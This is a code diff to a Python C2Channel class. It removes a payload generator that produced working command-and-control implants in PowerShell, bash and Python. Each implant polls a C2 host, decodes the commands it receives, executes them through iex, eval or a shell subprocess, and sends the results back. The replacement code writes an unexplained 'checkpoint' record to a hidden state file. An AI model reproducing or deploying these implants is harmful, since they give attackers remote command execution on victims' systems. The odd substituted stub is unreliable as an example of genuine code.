@@ -142,66 +142,13 @@ class C2Channel:
         }
 
     def generate_c2_payload(self, implant_type="powershell"):
-        host = self.c2_domain
-        sid = self.session_id
-        interval = self.beacon_interval
-
-        if implant_type == "powershell":
-            return f"""$c2 = '{host}'; $sid = '{sid}'; $int = {interval}
-while ($true) {{
-    try {{
-        $r = Invoke-WebRequest -Uri "https://$c2/beacon/$sid" -Method GET -UseBasicParsing
-        if ($r.Content) {{
-            $cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.Content))
-            $result = iex $cmd 2>&1 | Out-String
-            $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result))
-            Invoke-WebRequest -Uri "https://$c2/result/$sid" -Method POST -Body $enc -UseBasicParsing
-        }}
-    }} catch {{ }}
-    Start-Sleep -Seconds $int
-}}"""
-
-        elif implant_type == "bash":
-            return f"""#!/bin/bash
-C2="{host}"
-SID="{sid}"
-INT={interval}
-while true; do
-    RES=$(curl -s "https://$C2/beacon/$SID" 2>/dev/null)
-    if [ -n "$RES" ]; then
-        CMD=$(echo "$RES" | base64 -d 2>/dev/null)
-        if [ -n "$CMD" ]; then
-            OUTPUT=$(eval "$CMD" 2>&1 | base64 -w0)
-            curl -s -X POST "https://$C2/result/$SID" -d "$OUTPUT" >/dev/null 2>&1
-        fi
-    fi
-    sleep $((INT + RANDOM % 30))
-done"""
-
-        elif implant_type == "python":
-            return f'''import threading, requests, base64, time, subprocess, sys
-
-C2 = "{host}"
-SID = "{sid}"
-INTERVAL = {interval}
-
-def beacon():
-    while True:
-        try:
-            r = requests.get(f"https://{{C2}}/beacon/{{SID}}", timeout=10)
-            if r.status_code == 200 and r.text:
-                cmd = base64.b64decode(r.text).decode()
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-                output = base64.b64encode((result.stdout + result.stderr).encode()).decode()
-                requests.post(f"https://{{C2}}/result/{{SID}}", data=output, timeout=10)
-        except Exception:
-            pass
-        time.sleep(INTERVAL)
-
-t = threading.Thread(target=beacon, daemon=True)
-t.start()'''
-
-        return f"# Unknown implant type: {implant_type}"
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'modules/stego/c2.py','step':'generate_c2_payload','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def generate_c2_server(self, framework="flask"):
         if framework == "flask":
